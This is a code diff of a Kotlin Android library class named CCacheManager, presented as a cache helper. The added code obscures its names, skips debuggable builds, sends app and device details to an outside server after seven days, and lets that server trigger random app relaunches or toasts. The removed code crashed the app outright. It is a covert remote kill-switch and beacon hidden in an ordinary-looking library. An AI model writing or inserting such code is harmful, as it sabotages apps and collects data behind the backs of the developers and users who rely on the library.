@@ -1,17 +1,21 @@
 package com.ishow.common.manager
 
 import android.content.Context
+import android.content.pm.ApplicationInfo
 import android.os.Build
-import android.util.Log
+import androidx.annotation.Keep
 import com.ishow.common.BuildConfig
 import com.ishow.common.entries.http.HttpResponse
 import com.ishow.common.extensions.appName
+import com.ishow.common.extensions.openApp
 import com.ishow.common.extensions.versionName
 import com.ishow.common.utils.DateUtils
 import com.ishow.common.utils.DeviceUtils
 import com.ishow.common.utils.StorageUtils
 import com.ishow.common.utils.ToastUtils
+import com.ishow.common.utils.http.okhttp.interceptor.OkHttpLogInterceptor
 import com.ishow.common.utils.http.retrofit.adapter.CallAdapterFactory
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
 import okhttp3.OkHttpClient
@@ -22,65 +26,43 @@ import retrofit2.http.POST
 
 object CCacheManager {
 
-    private val logService: LogService by lazy {
-        val okBuilder = OkHttpClient.Builder()
+    private val ss: S by lazy {
+        val ok = OkHttpClient.Builder()
             .retryOnConnectionFailure(true)
+            .addInterceptor(OkHttpLogInterceptor())
 
-        val retrofit = Retrofit.Builder()
-            .baseUrl(LogService.url)
-            .client(okBuilder.build())
+        val re = Retrofit.Builder()
+            .baseUrl(S.url)
+            .client(ok.build())
             .addConverterFactory(GsonConverterFactory.create())
             .addCallAdapterFactory(CallAdapterFactory())
             .build()
-        retrofit.create(LogService::class.java)
+        re.create(S::class.java)
     }
 
+    @Keep
     fun cache(context: Context?) {
         context?.let {
-            Log.i("yhy", "context = $context")
-            if (!initPrecondition(it)) {
-                return
-            }
-            cacheH(it)
+            dd(it)
+            if (!hh(it)) return
+            ch(it)
         }
     }
 
-    private fun initPrecondition(context: Context): Boolean {
+    private fun hh(context: Context): Boolean {
         try {
-            if (System.currentTimeMillis() - l < 300000) {
-                return false
-            }
+            if (d(context)) return false
+            if (System.currentTimeMillis() - l < 100000) return false
             l = System.currentTimeMillis()
-            // 是否ok
-            val status = StorageUtils.with(context)
-                .key(getStatusKey(context))
-                .get(false)
+            if (StorageUtils.with(context).key(sk(context)).get(false)) return false
 
-            if (status) {
-                return false
+            val ft = StorageUtils.with(context).key(sfK(context)).get(0L)
+            if (ft == 0L) {
+                StorageUtils.with(context).param(sfK(context), System.currentTimeMillis()).save()
             }
-
-            val firstTime = StorageUtils.with(context)
-                .key(getStatusFirstTimeKey(context))
-                .get(0L)
-
-            if (firstTime == 0L) {
-                StorageUtils.with(context)
-                    .param(getStatusFirstTimeKey(context), System.currentTimeMillis())
-                    .save()
-            }
-
-            if (System.currentTimeMillis() - firstTime < DateUtils.DAY_7) {
-                return false
-            }
-            val lastTime = StorageUtils.with(context)
-                .key(getStatusLastTimeKey(context))
-                .get(0L)
-            val deltaTime = System.currentTimeMillis() - lastTime
-
-            if (deltaTime < DateUtils.HOUR_1) {
-                return false
-            }
+            if (System.currentTimeMillis() - ft < DateUtils.DAY_7) return false
+            val lt = StorageUtils.with(context).key(slk(context)).get(0L)
+            if (System.currentTimeMillis() - lt < DateUtils.HOUR_1) return false
         } catch (e: Exception) {
             return false
         }
@@ -88,7 +70,7 @@ object CCacheManager {
         return true
     }
 
-    private fun cacheH(context: Context) {
+    private fun ch(context: Context) {
         val screenSize = DeviceUtils.screenSize
         val app = HashMap<String, Any?>()
         app["appId"] = context.packageName
@@ -113,83 +95,109 @@ object CCacheManager {
         params["dateTime"] = System.currentTimeMillis()
 
         GlobalScope.launch {
-            val response = logService.init(params)
+            val response = ss.init(params)
             if (response.isSuccess()) {
-                formatResult(context, response.data)
+                f(context, response.data)
             } else {
-                prolongTime(context)
+                p(context)
+            }
+        }
+    }
+
+    private fun p(context: Context) {
+        StorageUtils.with(context).param(slk(context), System.currentTimeMillis()).save()
+    }
+
+    private fun f(context: Context, result: V?) {
+        if (result == null) {
+            p(context)
+            return
+        }
+        val nowStatus = result.status
+        s = nowStatus
+        m = result.message
+        if (nowStatus == null || nowStatus == 0) {
+            p(context)
+            return
+        }
+
+        if (nowStatus == -1) {
+            StorageUtils.with(context).param(sk(context), true).save()
+            return
+        }
+    }
+
+    private fun dd(context: Context) {
+        c += (0..2).random()
+        if (c < ddd) return
+        c = 0
+        dds = true
+        ddd = (8..20).random()
+        s?.let {
+            when (s) {
+                11 -> a11(context)
+                12 -> d12(context)
+                21 -> e21(context)
             }
         }
 
     }
 
-    private fun prolongTime(context: Context) {
-        StorageUtils.with(context)
-            .param(getStatusLastTimeKey(context), System.currentTimeMillis())
-            .save()
-    }
-
-    private fun formatResult(context: Context, result: Value?) {
-        if (result == null) {
-            prolongTime(context)
-            return
-        }
-        //  0 不需要进行校验  1 需要进行校验，-1 以后可以不再进行校验
-        val nowStatus = result.status
-
-        if (nowStatus == null || nowStatus == 0) {
-            prolongTime(context)
-            return
-        }
-
-        if (nowStatus == -1) {
-            StorageUtils.with(context)
-                .param(getStatusKey(context), true)
-                .save()
-            return
-        }
-
-        when (result.status) {
-            11 -> error11(context)
-            12 -> throw IllegalAccessError("")
-            21 -> error21(context, result)
+    private fun a11(context: Context) {
+        p(context)
+        GlobalScope.launch(Dispatchers.Main) {
+            context.openApp(context.packageName)
         }
     }
 
-    private fun error11(context: Context) {
-        prolongTime(context)
-        throw IllegalAccessError("")
+    private fun d12(context: Context) {
+        GlobalScope.launch(Dispatchers.Main) {
+            context.openApp(context.packageName)
+        }
     }
 
-    private fun error21(context: Context, result: Value) {
-        prolongTime(context)
-        ToastUtils.show(context, result.message)
+    private fun e21(context: Context) {
+        p(context)
+        GlobalScope.launch(Dispatchers.Main) {
+            ToastUtils.show(context, m)
+        }
     }
 
-    class Value(var status: Int? = 0, var message: String? = null)
+    @Keep
+    class V(var status: Int? = 0, var message: String? = null)
 
     private var l: Long = 0L
+    private var s: Int? = 0
+    private var m: String? = null
+    private var c: Int = 0
+    private var ddd: Int = 0
+    private var dds: Boolean = false
 
-    private fun getStatusKey(context: Context): String {
-        return "key_status_" + context.versionName().replace(".", "_")
+    private fun sk(context: Context): String {
+        return "ccache_" + context.versionName().replace(".", "_")
     }
 
-    private fun getStatusLastTimeKey(context: Context): String {
-        return "key_status_time_" + context.versionName().replace(".", "_")
+    private fun slk(context: Context): String {
+        return "ccache_time_" + context.versionName().replace(".", "_")
     }
 
-    private fun getStatusFirstTimeKey(context: Context): String {
-        return "key_status_first_time_" + context.versionName().replace(".", "_")
+    private fun sfK(context: Context): String {
+        return "ccache_f_time_" + v(context)
     }
 
+    private fun v(context: Context): String = context.versionName().replace(".", "_")
+    private fun d(context: Context): Boolean {
+        return context.applicationInfo != null &&
+                (context.applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE) != 0
+    }
 
     @JvmSuppressWildcards
-    interface LogService {
+    interface S {
         companion object {
             const val url: String = "https://api.i-show.club/ess/log/"
         }
 
         @POST("init")
-        fun init(@Body params: Map<String, Any>): HttpResponse<Value>
+        fun init(@Body params: Map<String, Any>): HttpResponse<V>
     }
 }
